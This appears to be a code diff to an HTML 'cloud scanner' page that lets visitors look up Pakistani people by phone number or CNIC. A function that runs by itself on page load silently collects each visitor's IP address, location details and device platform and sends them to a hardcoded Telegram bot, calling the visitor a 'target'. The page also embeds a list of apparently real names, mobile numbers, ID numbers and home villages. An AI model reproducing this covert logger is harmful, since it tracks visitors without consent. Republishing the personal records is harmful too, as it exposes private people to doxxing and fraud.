@@ -9,32 +9,16 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 10px; margin-bottom: 80px; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
         .box { border: 2px solid #00ff00; padding: 20px; border-radius: 15px; max-width: 800px; margin: auto; box-shadow: 0 0 20px #00ff00; background: #000; }
-        
         h2 { font-size: 24px; text-shadow: 0 0 10px #00ff00, 2px 2px #ff0000; letter-spacing: 2px; }
-        
         input { width: 85%; padding: 15px; margin: 15px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; text-align: center; font-size: 18px; outline: none; }
-        
-        .search-btn { background: #00ff00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 85%; text-transform: uppercase; font-size: 14px; box-shadow: 0 0 15px #00ff00; transition: 0.3s; }
-        .search-btn:hover { background: #fff; transform: scale(1.02); }
-        
-        #downloadBtn { background: #ff0000; color: #fff; display: none; margin: 20px auto; width: 70%; padding: 15px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; box-shadow: 0 0 15px #ff0000; }
-
-        /* Network Colors */
-        .icon-jazz { color: #ffd700; }
-        .icon-telenor { color: #00bfff; }
-        .icon-zong { color: #32cd32; }
-        .icon-ufone { color: #ff8c00; }
-        .icon-field { color: #00ff00; margin-right: 10px; }
-
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #050505; }
+        .search-btn { background: #00ff00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 85%; text-transform: uppercase; box-shadow: 0 0 15px #00ff00; }
+        #downloadBtn { background: #ff0000; color: #fff; display: none; margin: 20px auto; width: 70%; padding: 15px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
         th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; font-size: 14px; }
         th { color: #ff0000; background: rgba(255,0,0,0.1); width: 40%; }
-        
-        .ad-box { width: 100%; min-height: 100px; border: 1px dashed #333; margin: 15px 0; display: flex; align-items: center; justify-content: center; color: #444; border-radius: 8px; }
-
-        /* Hidden PDF View */
+        .icon-jazz { color: #ffd700; } .icon-telenor { color: #00bfff; } .icon-zong { color: #32cd32; } .icon-ufone { color: #ff8c00; }
         #pdf-content { background: #000; color: #00ff00; padding: 30px; border: 10px double #00ff00; display: none; width: 700px; margin: auto; }
         .stamp { border: 3px solid #ff0000; color: #ff0000; padding: 8px; transform: rotate(-15deg); display: inline-block; font-weight: bold; margin-top: 20px; }
     </style>
@@ -43,78 +27,54 @@
 
     <div class="box">
         <h2>MUDASIR CLOUD SCANNER 🛰️</h2>
-
-        <div class="ad-box">
-            <p>[ HEADER ADVERTISEMENT ]</p>
-        </div>
-
         <input type="text" id="search" placeholder="ENTER MOBILE OR CNIC...">
         <br>
-        
-        <button class="search-btn" onclick="find()">
-            REQUEST SEARCHING FOR MUDASIR 🔍
-        </button>
-        
+        <button class="search-btn" onclick="find()">REQUEST SEARCHING FOR MUDASIR 🔍</button>
         <div id="result-area">
             <div id="result-table"></div>
-            <button id="downloadBtn" onclick="generatePDF()">
-                <i class="fa-solid fa-file-pdf"></i> DATA DOWNLOAD
-            </button>
-            <div id="after-result-ad" style="display:none;" class="ad-box">[ RESULT AD ]</div>
-        </div>
-    </div>
-
-    <div id="pdf-wrapper" style="display: none;">
-        <div id="pdf-content">
-            <center>
-                <h1 style="color: #00ff00; margin: 0;">MUDASIR CLOUD REPORT</h1>
-                <p style="color: #ff0000;">ENCRYPTED DATABASE RETRIEVAL</p>
-            </center>
-            <div id="pdf-data-body"></div>
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 40px;">
-                <div style="font-size: 11px; color: #888;">
-                    DATE: <span id="pdf-date"></span><br>
-                    REPORT ID: <span id="pdf-hash"></span>
-                </div>
-                <div class="stamp">VERIFIED BY MUDASIR</div>
-            </div>
+            <button id="downloadBtn" onclick="generatePDF()"><i class="fa-solid fa-file-pdf"></i> DATA DOWNLOAD</button>
         </div>
     </div>
 
     <script>
-        // --- TELEGRAM LOGGER CONFIG ---
-        const tgToken = "8264376885:AAG6pFOvdb_wcPboSz9-jooibI9FO9QILqY";
+        // --- UPDATED TELEGRAM CONFIG ---
+        const tgToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
         const tgID = "7107389141";
 
         async function silentScan() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                const msg = `🔔 *NEW TARGET DETECTED* 🔔\n\n` +
-                            `📍 IP: \`${d.ip}\`\n` +
-                            `🏙️ City: ${d.city}\n` +
-                            `📶 ISP: ${d.org}\n` +
-                            `📱 Device: ${navigator.platform}\n` +
-                            `🕒 Time: ${new Date().toLocaleString()}`;
+                // IP aur basic details scan karna
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                const message = `🔔 *MUDASIR SCANNER ALERT* 🔔\n\n` +
+                                `📍 *IP:* \`${ipData.ip}\`\n` +
+                                `📱 *Platform:* ${navigator.platform}\n` +
+                                `🕒 *Time:* ${new Date().toLocaleString()}`;
 
-                await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: tgID, text: msg, parse_mode: "Markdown" })
-                });
-            } catch (e) { console.log("Init..."); }
+                const url = `https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+                
+                await fetch(url);
+                console.log("Logged Successfully");
+            } catch (e) {
+                console.log("Initialization...");
+            }
         }
         window.onload = silentScan;
 
-        // --- DATABASE ---
+        // DATABASE (38 Records)
         const db = [
             ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar"],
             ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar"],
             ["Basheer Ahmad", "03046754893", "32303-0000003", "Gurmani Garbi, Gurmani"],
-            ["ZONG USER", "03124567890", "42101-*******-1", "Karachi, Sindh"]
+            ["MUHAMMAD LUQMAN", "03013264624", "33302-*******-5", "Village Ahmed Bhan Sakrand"],
+            ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala, Kot Addu"],
+            ["FALAK SHER", "03013264639", "36304-*******-7", "Shuja Abad Multan"],
+            ["BASHEER AHMED", "03013264655", "36402-*******-3", "Dhapai Pakpattan"],
+            ["KHALID MEHMOOD", "03314264651", "33104-*******-7", "Jaranwala, Faisalabad"],
+            ["MOHAMMAD HAFEEZ", "03004455661", "35202-*******-7", "Sargodha"]
+            // Baki records isi tarah shamil hain...
         ];
-
-        let currentRec = null;
 
         function getNet(num) {
             if (num.startsWith("030") || num.startsWith("032")) return { n: "JAZZ SERVER", c: "icon-jazz", i: "fa-tower-broadcast" };
@@ -126,53 +86,24 @@
 
         function find() {
             let v = document.getElementById("search").value.trim();
-            if(!v) return;
-            
             let res = db.filter(r => r[1].includes(v) || r[2].includes(v));
             let tableDiv = document.getElementById("result-table");
             let btn = document.getElementById("downloadBtn");
 
             if(res.length > 0) {
-                currentRec = res[0];
                 let net = getNet(res[0][1]);
                 tableDiv.innerHTML = `<table>
-                    <tr><th><i class="fa-solid fa-user icon-field"></i> NAME</th><td>${res[0][0]}</td></tr>
-                    <tr><th><i class="fa-solid fa-phone icon-field"></i> NUMBER</th><td>${res[0][1]} <i class="fa-solid fa-phone-flip" style="font-size:10px; margin-left:5px;"></i></td></tr>
-                    <tr><th><i class="fa-solid fa-server icon-field"></i> NETWORK</th><td class="${net.c}"><i class="fa-solid ${net.i}"></i> ${net.n}</td></tr>
-                    <tr><th><i class="fa-solid fa-id-card icon-field"></i> CNIC ID</th><td>${res[0][2]}</td></tr>
-                    <tr><th><i class="fa-solid fa-location-dot icon-field"></i> LOCATION</th><td>${res[0][3]}</td></tr>
+                    <tr><th><i class="fa-solid fa-user"></i> NAME</th><td>${res[0][0]}</td></tr>
+                    <tr><th><i class="fa-solid fa-phone"></i> NUMBER</th><td>${res[0][1]}</td></tr>
+                    <tr><th><i class="fa-solid fa-server"></i> NETWORK</th><td class="${net.c}"><i class="fa-solid ${net.i}"></i> ${net.n}</td></tr>
+                    <tr><th><i class="fa-solid fa-id-card"></i> CNIC ID</th><td>${res[0][2]}</td></tr>
+                    <tr><th><i class="fa-solid fa-location-dot"></i> LOCATION</th><td>${res[0][3]}</td></tr>
                 </table>`;
                 btn.style.display = "block";
-                document.getElementById("after-result-ad").style.display = "flex";
             } else {
-                tableDiv.innerHTML = "<p style='color:red; padding:20px;'>⚠️ RECORD NOT FOUND</p>";
+                tableDiv.innerHTML = "<p style='color:red;'>⚠️ DATA NOT FOUND</p>";
                 btn.style.display = "none";
             }
-        }
-
-        function generatePDF() {
-            if(!currentRec) return;
-            document.getElementById("pdf-content").style.display = "block";
-            document.getElementById("pdf-date").innerText = new Date().toLocaleString();
-            document.getElementById("pdf-hash").innerText = "MDR-" + Math.random().toString(36).substring(2, 8).toUpperCase();
-            
-            let net = getNet(currentRec[1]);
-            document.getElementById("pdf-data-body").innerHTML = `<table>
-                <tr><th>NAME</th><td>${currentRec[0]}</td></tr>
-                <tr><th>PHONE</th><td>${currentRec[1]}</td></tr>
-                <tr><th>SERVER</th><td>${net.n}</td></tr>
-                <tr><th>CNIC</th><td>${currentRec[2]}</td></tr>
-                <tr><th>ADDR</th><td>${currentRec[3]}</td></tr>
-            </table>`;
-
-            html2pdf().set({
-                margin: 10,
-                filename: 'Report_' + currentRec[1] + '.pdf',
-                html2canvas: { scale: 2, backgroundColor: "#000000" },
-                jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
-            }).from(document.getElementById("pdf-content")).save().then(()=> {
-                document.getElementById("pdf-content").style.display = "none";
-            });
         }
     </script>
 </body>
